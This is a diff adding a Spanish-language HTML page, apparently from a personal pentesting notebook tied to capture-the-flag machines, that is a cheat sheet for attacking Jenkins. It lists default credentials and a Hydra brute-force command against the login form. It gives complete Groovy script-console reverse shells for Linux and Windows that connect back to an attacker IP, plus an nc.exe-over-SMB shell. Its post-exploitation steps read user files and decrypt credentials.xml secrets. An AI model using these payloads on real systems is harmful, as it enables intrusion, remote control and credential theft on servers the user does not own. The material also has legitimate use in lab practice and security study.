@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Jenkins | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="jenkins">
+          <div class="note-tabbar">
+            <span>Jenkins</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Administración y monitorización</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / administración y monitorización / jenkins</p>
+            <h2>Jenkins</h2>
+
+            <h2>Enumeración</h2>
+
+            <section class="code-card">
+              <h3>Versiones</h3>
+              <pre><code>whatweb -v &lt;url&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Nmap</h3>
+              <pre><code>nmap -sV --script http-jenkins-enum &lt;url&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Hydra</h3>
+              <pre><code>hydra -L &lt;users.txt&gt; -P &lt;pass.txt&gt; &lt;url&gt; http-post-form &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:F=incorrect&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Credenciales por defecto</h3>
+              <pre><code>admin:admin
+jenkins:jenkins
+admin:password</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Rutas de usuarios</h3>
+              <pre><code># Ver passwd para encontrar directorio Jenkins
+/var/jenkins_home/users/users.xml
+/var/jenkins_home/users/&lt;user&gt;_&lt;id&gt;/config.xml</code></pre>
+            </section>
+
+            <h2>Explotar acceso a la consola de scripts de Groovy</h2>
+
+            <section class="code-card">
+              <h3>Manual</h3>
+              <pre><code># Comprobar acceso al recurso http://&lt;ip&gt;/script/
+command = &quot;whoami&quot;
+command.execute().text
+# Tras enviar la consulta vemos el output</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Linux reverse shell desde Groovy</h3>
+              <pre><code>String host=&quot;&lt;kali_ip&gt;&quot;;
+int port=443;
+String cmd=&quot;/bin/bash&quot;;
+
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Windows reverse shell con nc.exe por SMB</h3>
+              <pre><code># Kali: hostear nc.exe por SMB
+impacket-smbserver smb $(pwd)
+penelope -p 443
+
+# Groovy
+&quot;\\&lt;kali_ip&gt;\smb\nc.exe &lt;kali_ip&gt; 443 -e cmd&quot;
+cmd.execute().text</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Windows reverse shell desde Groovy</h3>
+              <pre><code># Kali: Listener
+penelope -p 443
+
+# Groovy
+Thread.start {
+String host=&quot;&lt;kali_ip&gt;&quot;;
+int port=443;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+}</code></pre>
+            </section>
+
+            <h2>Post-explotación</h2>
+
+            <section class="code-card">
+              <h3>Enumerar usuarios</h3>
+              <pre><code>cat /var/lib/jenkins/config.xml | grep &#x27;&lt;user&gt;&#x27;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Buscar credenciales en credentials.xml</h3>
+              <pre><code>/var/jenkins/credentials.xml
+# Etiqueta &lt;privateKey&gt;
+# Descifrar en consola Groovy
+println(hudson.util.Secret.decrypt(&quot;{AQAAABAAAAow...MaKSM=}&quot;))</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=jeeves">Jeeves</a>
+              <a href="/writeups.html?machine=builder">Builder</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>jenkins</span>
+              <span>groovy</span>
+              <span>rce</span>
+              <span>credenciales</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
